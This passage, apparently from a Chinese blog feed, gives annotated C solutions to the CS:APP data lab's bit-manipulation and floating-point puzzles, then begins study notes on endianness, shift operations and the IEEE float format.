&gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 90</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">intLog2</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> n = <span class="number">0</span>;</span><br><span class="line">  n += ((!!(x&amp;((~<span class="number">0</span>)&lt;&lt;(n+<span class="number">16</span>)))) &lt;&lt; <span class="number">4</span>);</span><br><span class="line">  n += ((!!(x&amp;((~<span class="number">0</span>)&lt;&lt;(n+<span class="number">8</span>)))) &lt;&lt; <span class="number">3</span>);</span><br><span class="line">  n += ((!!(x&amp;((~<span class="number">0</span>)&lt;&lt;(n+<span class="number">4</span>)))) &lt;&lt; <span class="number">2</span>);</span><br><span class="line">  n += ((!!(x&amp;((~<span class="number">0</span>)&lt;&lt;(n+<span class="number">2</span>)))) &lt;&lt; <span class="number">1</span>);</span><br><span class="line">  n += (!!(x&amp;((~<span class="number">0</span>)&lt;&lt;(n+<span class="number">1</span>))));</span><br><span class="line">  <span class="keyword">return</span> n;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于<code>‭0001 0000‬</code>(16)来说，其log<del>2</del>16=4,可以看到其实就是最高位置-1，类似第14题，不过此题输入没有负数，所以直接判断到最高位就行了。</p><h1 id="17-floatNegate-unsigned-uf"><a href="#17-floatNegate-unsigned-uf" class="headerlink" title="17.floatNegate(unsigned uf)"></a>17.floatNegate(unsigned uf)</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//float</span></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * floatNegate - Return bit-level equivalent of expression -f for</span></span><br><span class="line"><span class="comment"> *   floating point argument f.</span></span><br><span class="line"><span class="comment"> *   Both the argument and result are passed as unsigned int&#x27;s, but</span></span><br><span class="line"><span class="comment"> *   they are to be interpreted as the bit-level representations of</span></span><br><span class="line"><span class="comment"> *   single-precision floating point values.</span></span><br><span class="line"><span class="comment"> *   When argument is NaN, return argument.</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 10</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">floatNegate</span><span class="params">(<span class="keyword">unsigned</span> uf)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span>((uf&amp;<span class="number">0x7fffffff</span>) &gt; <span class="number">0x7f800000</span>) <span class="keyword">return</span> uf;</span><br><span class="line"> <span class="keyword">return</span> uf ^ <span class="number">0x80000000</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>计算浮点数<code>-uf</code>，主要是判断是否是无穷大，根据浮点数的概念<code>0|0000000|0000··0000</code> 阶码时否全为1则为无穷大，所以<code>‭01111111111111111111111111111111‬</code>(0x7fffffff)将符号位转为相同，然后与<code>‭01111111100000000000000000000000‬</code>(0x7f800000)相比较如果大于该数则转为浮点数时必位无穷大，直接返回，其他情况改变一下符号。</p><h1 id="18-floatScale-unsigned-uf"><a href="#18-floatScale-unsigned-uf" class="headerlink" title="18.floatScale(unsigned uf)"></a>18.floatScale(unsigned uf)</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * floatScale2 - Return bit-level equivalent of expression 2*f for</span></span><br><span class="line"><span class="comment"> *   floating point argument f.</span></span><br><span class="line"><span class="comment"> *   Both the argument and result are passed as unsigned int&#x27;s, but</span></span><br><span class="line"><span class="comment"> *   they are to be interpreted as the bit-level representation of</span></span><br><span class="line"><span class="comment"> *   single-precision floating point values.</span></span><br><span class="line"><span class="comment"> *   When argument is NaN, return argument</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 30</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">floatScale2</span><span class="params">(<span class="keyword">unsigned</span> uf)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> flag = uf&gt;&gt;<span class="number">31</span>;<span class="comment">//由于是无符号数的右移，所以flag是1或0，记录符号位</span></span><br><span class="line">  <span class="keyword">unsigned</span> exp = (uf&gt;&gt;<span class="number">23</span>)&amp;<span class="number">0xff</span>;<span class="comment">//提取阶码 阶码是8位 1位符号位 去除符号位</span></span><br><span class="line">  <span class="comment">//规格化的 直接阶码加一再替换原来的阶码就好</span></span><br><span class="line">  <span class="keyword">int</span> res_exp = (exp  + <span class="number">1</span>)&lt;&lt;<span class="number">23</span>;</span><br><span class="line">  <span class="keyword">int</span> res = uf &amp; <span class="number">0x807fffff</span>;<span class="comment">//提取尾数</span></span><br><span class="line">  <span class="comment">//无穷大返回自身</span></span><br><span class="line">  <span class="keyword">if</span>(exp == <span class="number">255</span>)</span><br><span class="line">    <span class="keyword">return</span> uf;</span><br><span class="line">  <span class="comment">//非规格化的</span></span><br><span class="line">  <span class="keyword">if</span>(exp == <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">//如果尾数的第一位为0，直接左移是*2，如果尾数的第一位为1，将该1左移到阶码也是*2</span></span><br><span class="line">    uf = uf &lt;&lt; <span class="number">1</span>;</span><br><span class="line">    uf = uf | (flag&lt;&lt;<span class="number">31</span>);</span><br><span class="line">    <span class="keyword">return</span> uf;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//规格化的 直接阶码加一再替换原来的阶码就好</span></span><br><span class="line">  <span class="keyword">return</span> res | res_exp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该题计算浮点数<code>2*f</code>，对于此题根据浮点数的标准，将符号位(uf&gt;&gt;31)，阶码位(uf&gt;&gt;23&amp;0xff)，尾数位(uf&amp; 0x807fffff)；根据阶码位可以将分位规格化值和非规格化值和无穷大</p><p><strong>规格化的值</strong>直接将阶码+1然后返回就行</p><p><strong>非规格化的值</strong>通过计算发现不管尾数第一位是1或0将其左移一位得到的也是*2</p><p><strong>无穷大</strong>直接返回自身</p><h1 id="19-floatFloat2Int-uf"><a href="#19-floatFloat2Int-uf" class="headerlink" title="19.floatFloat2Int(uf)"></a>19.floatFloat2Int(uf)</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * floatFloat2Int - Return bit-level equivalent of expression (int) f</span></span><br><span class="line"><span class="comment"> *   for floating point argument f.</span></span><br><span class="line"><span class="comment"> *   Argument is passed as unsigned int, but</span></span><br><span class="line"><span class="comment"> *   it is to be interpreted as the bit-level representation of a</span></span><br><span class="line"><span class="comment"> *   single-precision floating point value.</span></span><br><span class="line"><span class="comment"> *   Anything out of range (including NaN and infinity) should return</span></span><br><span class="line"><span class="comment"> *   0x80000000u.</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 30</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">floatFloat2Int</span><span class="params">(<span class="keyword">unsigned</span> uf)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> flag = uf&gt;&gt;<span class="number">31</span>;<span class="comment">//由于是无符号数的右移，所以flag是1或0，记录符号位</span></span><br><span class="line">  <span class="keyword">unsigned</span> exp = (uf&gt;&gt;<span class="number">23</span>)&amp;<span class="number">0xff</span>;<span class="comment">//提取阶码 去除符号位</span></span><br><span class="line">  <span class="keyword">unsigned</span> last_num = uf&amp;<span class="number">0x7fffff</span>;<span class="comment">//提取尾数</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//规格化的</span></span><br><span class="line">  <span class="keyword">int</span> real_exp = exp - <span class="number">127</span>;<span class="comment">//移码减去偏置 这里一定要是int型 不然没办法判断是否大于0 </span></span><br><span class="line">  <span class="keyword">unsigned</span> real_last_num = last_num | <span class="number">0x800000</span>;<span class="comment">//添上隐式的1</span></span><br><span class="line">  <span class="comment">//无穷大和nan</span></span><br><span class="line">  <span class="keyword">if</span>(exp == <span class="number">255</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0x80000000</span>;</span><br><span class="line">  <span class="comment">//非规格化的</span></span><br><span class="line">  <span class="keyword">if</span>(exp == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">//非常接近0的小数 直接舍弃小数变为0</span></span><br><span class="line">  <span class="comment">//规格化的</span></span><br><span class="line">  <span class="keyword">if</span>(real_exp &gt;= <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span>(real_exp&gt;=<span class="number">31</span>)<span class="comment">//overflow</span></span><br><span class="line">      <span class="keyword">return</span> <span class="number">0x80000000</span>;</span><br><span class="line">      </span><br><span class="line">    real_last_num = real_last_num &gt;&gt; (<span class="number">23</span> - real_exp);<span class="comment">//移码的意义 而且对于小数部分舍弃了</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(flag)<span class="comment">//若是负数 还要转为补码形式</span></span><br><span class="line">      real_last_num= ~real_last_num+<span class="number">1</span>;</span><br><span class="line">      </span><br><span class="line">    <span class="keyword">return</span> real_last_num;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//real_exp&lt;0 则说明是绝对值小于1的数 直接返回0</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先举个例子：int的875表示<code>0000 0000 0000 0000 ‭0000 0011 0110 1011‬</code></p><p>​                 float的875.00表示 <code>0, 10001000, 1011 0101 100000000000000</code></p><p>float转化成int型，首先是对于读出阶码e=136，E=136-127=9，尾数f=1.708984375，所以结果V=1.708984375*2<sup>9</sup>=875。而其中的进制转化可以看成尾数位模式前+1得到序列</p><p><code>000000001, 1011 0101 100000000000000</code>然后对该序列右移23-9=<strong>14</strong>即可得到int表示的结果</p><p><strong>——————————————————————————————————————————</strong></p><p>对于此题其实主要的算法就是上述例子，首先判断该数是否位规格数，如果是非规格数或无穷大直接舍去；判断之后算出该阶码，如果阶码大于31的话，此时23-减去阶码位得到小于等于-8的数，此时由于左移的最大限度只能到31位，32位为符号位，所以最多只能左移7位(其中包括<strong>隐式位</strong>)。</p><h1 id="20-floatPower-x"><a href="#20-floatPower-x" class="headerlink" title="20.floatPower(x)"></a>20.floatPower(x)</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment">Power2 - Return bit-level equivalent of the expression 2.0^x</span></span><br><span class="line"><span class="comment"> *   (2.0 raised to the power x) for any 32-bit integer x.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   The unsigned value that is returned should have the identical bit</span></span><br><span class="line"><span class="comment"> *   representation as the single-precision floating-point number 2.0^x.</span></span><br><span class="line"><span class="comment"> *   If the result is too small to be represented as a denorm, return</span></span><br><span class="line"><span class="comment"> *   0. If too large, return +INF.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. Also if, while </span></span><br><span class="line"><span class="comment"> *   Max ops: 30 </span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">floatPower2</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> exp = x + <span class="number">127</span>;</span><br><span class="line">  <span class="keyword">if</span>(exp &lt;= <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span>(exp &gt;= <span class="number">255</span>) <span class="keyword">return</span> <span class="number">0x7f800000</span>;</span><br><span class="line">  <span class="keyword">return</span> exp &lt;&lt; <span class="number">23</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此题是没什么难度，根据浮点数的位模式，如果尾数全为0的话，f=1，又E=e-127，所以+127得到e，e是第24位到31位，直接左移23位就可以V=1x2<sup>x</sup>=1x2<sup>e-127</sup>,假设要算2<sup>8</sup>它的浮点数位模式应该是<code>0 1000 0111‬ 0000 0000 0000 0000 0000 000</code>也就是将<code>10000111‬</code>(8+127)左移23位。</p>]]></content>
      
      
      <categories>
          
          <category> 深入理解计算机系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>深入理解计算机系统-信息的表示和处理</title>
      <link href="/2020/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E4%BF%A1%E6%81%AF%E7%9A%84%E8%A1%A8%E7%A4%BA%E5%92%8C%E5%A4%84%E7%90%86/"/>
      <url>/2020/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E4%BF%A1%E6%81%AF%E7%9A%84%E8%A1%A8%E7%A4%BA%E5%92%8C%E5%A4%84%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h1 id="1-字数据的大小"><a href="#1-字数据的大小" class="headerlink" title="1.字数据的大小"></a>1.字数据的大小</h1><p>计算机都有一个字长，指明指针数据的标称大小，所以字长决定的最重要的系统参数就是<strong>虚拟地址空间</strong>的最大大小。对于一个字长为x位机器，虚拟地址的范围是0~2<sup>x</sup>-1,程序最多访问2<sup>x</sup>个字节。</p><h1 id="2-寻址和字节顺序"><a href="#2-寻址和字节顺序" class="headerlink" title="2.寻址和字节顺序"></a>2.寻址和字节顺序</h1><p><strong>小端法</strong>：机器在内存中按照从最低有效字节到最高有效字节的顺序存储对象</p><p><strong>大端法</strong>：机器在内存中按照从最高有效字节到最低有效字节的顺序存储对象</p><p>存储变量<code>0x1234567</code>，高位字节的十六进制值为0x01，而低位字节值为0x67</p><p>大端法（低位地址存数据高位；高位地址存数据低位）：<img src="/2020/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E4%BF%A1%E6%81%AF%E7%9A%84%E8%A1%A8%E7%A4%BA%E5%92%8C%E5%A4%84%E7%90%86/20190624162418741.png" class="lazyload" data-srcset="/2020/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E4%BF%A1%E6%81%AF%E7%9A%84%E8%A1%A8%E7%A4%BA%E5%92%8C%E5%A4%84%E7%90%86/20190624162418741.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><p>小端法（低位地址存数据低位；高位地址存数据高位）：<img src="/2020/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E4%BF%A1%E6%81%AF%E7%9A%84%E8%A1%A8%E7%A4%BA%E5%92%8C%E5%A4%84%E7%90%86/20190624162727576.png" class="lazyload" data-srcset="/2020/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E4%BF%A1%E6%81%AF%E7%9A%84%E8%A1%A8%E7%A4%BA%E5%92%8C%E5%A4%84%E7%90%86/20190624162727576.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><p><strong>小端模式低存低 高存高</strong></p><p>Windows Linux Android IOS基本都是运行小端模式</p><h1 id="3-移位运算"><a href="#3-移位运算" class="headerlink" title="3.移位运算"></a>3.移位运算</h1><p>左移k位表示丢弃最高的k位，低位补0；</p><p>右移有<strong>逻辑右移</strong>和<strong>算术右移</strong>：逻辑右移在左端补k个0；算术右移是在左端补k个最高有效位的值，最高为0就全补0，最高为1就全补1</p><table><thead><tr><th>操作</th><th>值</th></tr></thead><tbody><tr><td>参数x</td><td>01100011</td></tr><tr><td>x&lt;&lt;4</td><td>0011<strong>0000</strong></td></tr><tr><td>x&gt;&gt;4(逻辑右移)</td><td><strong>0000</strong>0110</td></tr><tr><td>x&gt;&gt;4(逻辑右移)</td><td><strong>0000</strong>0110</td></tr><tr><td><strong>操作</strong></td><td><strong>值</strong></td></tr><tr><td>参数x</td><td>10010101</td></tr><tr><td>x&gt;&gt;4(算术右移)</td><td><strong>1111</strong>1001</td></tr></tbody></table><p>与C语言相比，JAVA对于右移有明确的定义，表达x&gt;&gt;k会将x算术右移k个位置，而x&gt;&gt;&gt;k会对x做逻辑右移</p><h1 id="4-浮点数的表示"><a href="#4-浮点数的表示" class="headerlink" title="4.浮点数的表示"></a>4.浮点数的表示</h1><img src="/2020/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E4%BF%A1%E6%81%AF%E7%9A%84%E8%A1%A8%E7%A4%BA%E5%92%8C%E5%A4%84%E7%90%86/image-20201215145902355.png" class="lazyload" data-srcset="/2020/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E4%BF%A1%E6%81%AF%E7%9A%84%E8%A1%A8%E7%A4%BA%E5%92%8C%E5%A4%84%E7%90%86/image-20201215145902355.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201215145902355" style="zoom:50%;"><img src="/2020/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E4%BF%A1%E6%81%AF%E7%9A%84%E8%A1%A8%E7%A4%BA%E5%92%8C%E5%A4%84%E7%90%86/image-20201215145918632.png" class="lazyload" data-srcset="/2020/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E4%BF%A1%E6%81%AF%E7%9A%84%E8%A1%A8%E7%A4%BA%E5%92%8C%E5%A4%84%E7%90%86/image-20201215145918632.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201215145918632" style="zoom:50%;"><p><strong>4.1、IEEE浮点标准：V=(-1)<sup>s</sup>xMx2<sup>E</sup></strong></p><ul><li>符号（sign）s决定是负数（s=1）还是正数（s=0），而对于数值0的符号位解释作为特殊情况处理。</li><li>尾数（significand）M是一个二进制小数，它的范围是1–2-ε，或者是0–1-ε。</li><li>阶码（exponent）E的作用是对浮点数加权，这个权重是2的E次幂（可能是负数）。</li></ul><p><img src="/2020/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E4%BF%A1%E6%81%AF%E7%9A%84%E8%A1%A8%E7%A4%BA%E5%92%8C%E5%A4%84%E7%90%86/1334023-20190725110015691-1060180799.png" class="lazyload" data-srcset="/2020/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E4%BF%A1%E6%81%AF%E7%9A%84%E8%A1%A8%E7%A4%BA%E5%92%8C%E5%A4%84%E7%90%86/1334023-20190725110015691-1060180799.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><p>在单精度浮点格式（C语言中的float）中，s、exp和frac字段分别为1位、k=8位和n=23位，得到一个32位的表示。在双精度浮点格式（C语言的double）中，s、exp和frac字段分别为1位、k=11位和n=52位，得到一个64位的表示。</p><p><strong>4.2、根据exp的值，被编码的值可以分为三种不同的情况，最后一种情况有两个变种</strong></p><p><img src="/2020/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E4%BF%A1%E6%81%AF%E7%9A%84%E8%A1%A8%E7%A4%BA%E5%92%8C%E5%A4%84%E7%90%86/1334023-20190725110327696-469743310.png" class="lazyload" data-srcset="/2020/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E4%BF%A1%E6%81%AF%E7%9A%84%E8%A1%A8%E7%A4%BA%E5%92%8C%E5%A4%84%E7%90%86/1334023-20190725110327696-469743310.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><ul><li><p><strong>情况1（规格化的值）：exp的位模式（8位或者11位）不全是0也不全是1（对于单精度来说为255，对于双精度是2047）</strong>，在这种情况，阶码字段被解释为偏置形式表示的有符号整数。也就是说，阶码的值是<strong>E</strong>=<strong>e</strong>(读出来的数)<strong>-Bias</strong>(阶码偏置量)，其中e是无符号数，其位表示为e<del>k-1</del>……e<del>1</del>e<del>0</del>，而Bias是一个等于2<sup>k-1</sup>-1（<strong>单精度是127，双精度是1023</strong>）的偏置值。由此产生指数的取值范围，对于单精度是-126—+127，而对于双精度是-1022—+1023。</p><p>小数字段frac被解释为描述小数值f，其中0&lt;=f&lt;1，其二进制表示为0.f<del>n-1</del>……f<del>1</del>f<del>0</del>，也就是二进制小数点在最高有效位的左边。<strong>尾数定义为M=1+f</strong>。有时，这种方式也叫做隐含的以1开头的表示，因为我们可以把M看成一个二进制表达式1.f<del>n-1</del>f<del>n-2</del>……f<del>0</del>的数字。既然我们总是能调整阶码E，使得尾数M在范围1&lt;=M&lt;2之中（假设没有溢出），那么这种表示方法是一种轻松获得一个额外精度位的技巧。既然第一位总是等于1，那么我们就不需要显示地表示它。</p></li></ul><p>假设一个单精度浮点数的位模式为</p><p><code>0|0111 1111|0100 0000 0000 0000 0000 000</code></p><p>首先读出它的符号位为0，为正数，然后由于为一个单精度浮点数，所以他的<strong>阶码偏置量</strong>为2<sup>8-1</sup>-1=127(<code>0111 